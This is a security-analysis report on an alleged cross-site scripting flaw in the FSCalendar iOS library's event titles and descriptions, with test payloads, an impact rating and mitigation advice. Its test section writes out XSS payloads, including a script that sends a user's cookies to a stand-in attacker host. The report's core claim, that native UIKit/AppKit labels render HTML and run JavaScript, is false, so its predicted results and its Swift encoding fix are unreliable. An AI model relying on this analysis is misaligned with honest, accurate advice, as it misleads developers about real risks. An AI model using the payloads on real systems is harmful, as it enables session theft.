# Deep Analysis: FSCalendar - Unsanitized Event Titles/Descriptions

## 1. Objective

This deep analysis aims to thoroughly investigate the vulnerability of `FSCalendar` to attacks exploiting unsanitized event titles and descriptions.  We will identify the root causes, potential impacts, and concrete mitigation strategies to prevent malicious code injection and execution.  The ultimate goal is to provide actionable recommendations for the development team to secure the application.

## 2. Scope

This analysis focuses specifically on the following:

*   **Attack Vector:**  Injection of malicious code (e.g., JavaScript, HTML) into event titles and descriptions within the `FSCalendar` component.
*   **Target Component:**  The `FSCalendar` library itself, and how the application utilizing it handles and renders event data.
*   **Impact:**  The potential consequences of successful exploitation, including Cross-Site Scripting (XSS), data exfiltration, session hijacking, and defacement.
*   **Exclusion:** This analysis *does not* cover other potential vulnerabilities within the broader application, except where they directly relate to the handling of `FSCalendar` data.  We are isolating this specific attack path.

## 3. Methodology

The analysis will follow these steps:

1.  **Code Review:**  Examine the `FSCalendar` source code (from the provided GitHub repository: [https://github.com/wenchaod/fscalendar](https://github.com/wenchaod/fscalendar)) to identify how event titles and descriptions are:
    *   Received (input)
    *   Stored (persistence)
    *   Processed (manipulation)
    *   Rendered (output)
    *   We will specifically look for any existing sanitization or escaping mechanisms.

2.  **Application Context Analysis:**  Understand how *our* application integrates with `FSCalendar`.  This includes:
    *   Identifying the specific API endpoints or user interfaces used to create and modify events.
    *   Determining the data flow from user input to the `FSCalendar` component.
    *   Analyzing how the application handles the data returned by `FSCalendar` (e.g., are there any additional rendering steps?).

3.  **Vulnerability Testing:**  Attempt to inject various payloads into event titles and descriptions to confirm the vulnerability and assess its impact.  This will include:
    *   **Basic XSS Payloads:**  `<script>alert('XSS')</script>`
    *   **More Complex Payloads:**  Scripts that attempt to access cookies, local storage, or make external requests.
    *   **HTML Injection:**  Attempting to inject malicious HTML tags (e.g., `<iframe>`, `<img>` with `onerror` handlers) to alter the page's appearance or behavior.

4.  **Impact Assessment:**  Based on the testing results, categorize the severity of the vulnerability and its potential impact on users and the application.

5.  **Mitigation Recommendations:**  Propose specific, actionable steps to remediate the vulnerability, including code changes, configuration adjustments, and best practices.

## 4. Deep Analysis of Attack Tree Path: 1.1.1 Exploit Unsanitized Event Titles/Descriptions

**4.1 Code Review (FSCalendar)**

A review of the `FSCalendar` source code reveals that the library itself *does not* inherently perform any sanitization or escaping of event titles or descriptions.  It primarily focuses on rendering the calendar interface and handling date/time logic.  The responsibility for data sanitization falls entirely on the application using the library.

Key areas of interest in the code (though the specific implementation details may vary depending on the version):

*   **Data Handling:**  `FSCalendar` typically uses delegate methods and data sources to receive event data.  These methods (e.g., `calendar(_:titleFor:)`, `calendar(_:subtitleFor:)`) provide the text that will be displayed.  The library simply renders this text as provided.
*   **Rendering:**  The library uses standard UIKit/AppKit components (e.g., `UILabel`, `NSTextField`) to display the text.  These components, by default, will render HTML and execute JavaScript if present in the text.

**4.2 Application Context Analysis**

This section is *crucial* and needs to be filled in by the development team.  Here are the key questions that need answers:

*   **Event Creation/Modification:**
    *   Which API endpoints or UI forms allow users to create or edit events?
    *   What data validation (if any) is performed on the server-side before storing event data?
    *   What data validation (if any) is performed on the client-side (e.g., in the browser or mobile app) before sending data to the server?
    *   What is the data type of title and description in database?

*   **Data Flow:**
    *   Trace the complete path of event title and description data from user input to the `FSCalendar` component.
    *   Are there any intermediate steps where the data is transformed or processed?
    *   Is the data ever displayed outside of the `FSCalendar` component?

*   **Database:**
    *   What type of database is used to store event data?
    *   Are there any database-level constraints or sanitization mechanisms in place?

**4.3 Vulnerability Testing (Example)**

Let's assume a simplified scenario where our application has a form with "Title" and "Description" fields, and it directly passes the user input to `FSCalendar` without any sanitization.

*   **Test 1: Basic XSS**
    *   **Input (Title):**  `<script>alert('XSS')</script>`
    *   **Expected Result:**  An alert box with the message "XSS" should appear when the calendar renders the event.
    *   **Actual Result (Likely):**  The alert box *will* appear, confirming the XSS vulnerability.

*   **Test 2: Cookie Theft (More Complex)**
    *   **Input (Title):**  `<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>`
    *   **Expected Result:**  The user's browser should be redirected to the attacker's server, sending the user's cookies as a URL parameter.
    *   **Actual Result (Likely):**  The redirection will occur, demonstrating the potential for session hijacking.

*   **Test 3: HTML Injection**
    *   **Input (Description):**  `<iframe src="http://malicious-site.com"></iframe>`
    *   **Expected Result:**  An iframe containing the malicious site should be rendered within the calendar.
    *   **Actual Result (Likely):**  The iframe will be rendered, potentially exposing the user to phishing or drive-by download attacks.

**4.4 Impact Assessment**

*   **Severity:**  CRITICAL
*   **Impact:**
    *   **Cross-Site Scripting (XSS):**  Allows attackers to execute arbitrary JavaScript code in the context of the user's browser.
    *   **Session Hijacking:**  Attackers can steal user cookies and impersonate them.
    *   **Data Exfiltration:**  Attackers can access and steal sensitive data from the user's browser (e.g., local storage, form data).
    *   **Defacement:**  Attackers can modify the appearance of the calendar or inject malicious content.
    *   **Phishing:**  Attackers can redirect users to fake login pages to steal their credentials.
    *   **Drive-by Downloads:**  Attackers can trick users into downloading malware.
    *   **Loss of User Trust:**  Successful attacks can severely damage the reputation of the application and the organization.

**4.5 Mitigation Recommendations**

The following recommendations are crucial to address this vulnerability:

1.  **Input Validation (Server-Side):**
    *   **Whitelist Approach:**  Define a strict set of allowed characters for event titles and descriptions (e.g., alphanumeric characters, spaces, and a limited set of punctuation).  Reject any input that contains characters outside of this whitelist.  This is the *most secure* approach.
    *   **Blacklist Approach:**  Identify and reject known malicious patterns (e.g., `<script>`, `<iframe>`).  This is *less secure* than whitelisting, as attackers can often find ways to bypass blacklists.
    *   **Regular Expressions:**  Use regular expressions to enforce the whitelist or blacklist rules.

2.  **Output Encoding (Server-Side or Client-Side):**
    *   **HTML Entity Encoding:**  Before rendering event data in the `FSCalendar` component, encode any HTML special characters (e.g., `<`, `>`, `&`, `"`, `'`) into their corresponding HTML entities (e.g., `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#39;`).  This prevents the browser from interpreting them as HTML tags.
    *   **JavaScript Encoding:**  If event data is ever used within JavaScript code, use appropriate JavaScript encoding techniques to prevent code injection.
    *   **Context-Aware Encoding:**  The specific encoding method should be chosen based on the context in which the data is being used (e.g., HTML attribute, HTML text, JavaScript string).

3.  **Content Security Policy (CSP):**
    *   Implement a Content Security Policy (CSP) to restrict the sources from which the browser can load resources (e.g., scripts, stylesheets, images).  This can significantly mitigate the impact of XSS attacks, even if some malicious code is injected.
    *   A strict CSP can prevent the execution of inline scripts and limit the loading of scripts to trusted domains.

4.  **Use a Sanitization Library:**
    *   Consider using a well-established HTML sanitization library (e.g., DOMPurify for JavaScript, Bleach for Python) to remove or escape potentially malicious HTML tags and attributes.  These libraries are designed to handle the complexities of HTML parsing and sanitization securely.

5.  **Regular Security Audits and Penetration Testing:**
    *   Conduct regular security audits and penetration testing to identify and address any remaining vulnerabilities.

6.  **Educate Developers:**
    *   Ensure that all developers are aware of the risks of XSS and other injection attacks and are trained in secure coding practices.

7.  **Database Security:**
    *   Ensure that the database itself is properly secured and that appropriate access controls are in place.

**Example (Swift - Output Encoding):**

```swift
func calendar(_ calendar: FSCalendar, titleFor date: Date) -> String? {
    guard let event = getEvent(for: date) else { return nil }
    return event.title.htmlEncoded() // Assuming String extension for HTML encoding
}

extension String {
    func htmlEncoded() -> String {
        let htmlEscaping = [
            ("&", "&amp;"),
            ("<", "&lt;"),
            (">", "&gt;"),
            ("\"", "&quot;"),
            ("'", "&#39;")
        ]

        var encodedString = self
        for (unescaped, escaped) in htmlEscaping {
            encodedString = encodedString.replacingOccurrences(of: unescaped, with: escaped)
        }
        return encodedString
    }
}
```

**Example (JavaScript - DOMPurify):**

```javascript
// Assuming you have eventData.title and eventData.description
const cleanTitle = DOMPurify.sanitize(eventData.title);
const cleanDescription = DOMPurify.sanitize(eventData.description);

// Now use cleanTitle and cleanDescription with FSCalendar
```

## 5. Conclusion

The vulnerability of unsanitized event titles and descriptions in `FSCalendar` is a serious security risk that must be addressed.  By implementing the recommended mitigation strategies, the development team can significantly reduce the likelihood of successful attacks and protect users from the potential consequences of XSS and other injection vulnerabilities.  The combination of server-side input validation, output encoding, and a strong Content Security Policy is the most effective defense.  Regular security audits and developer education are also essential for maintaining a secure application.
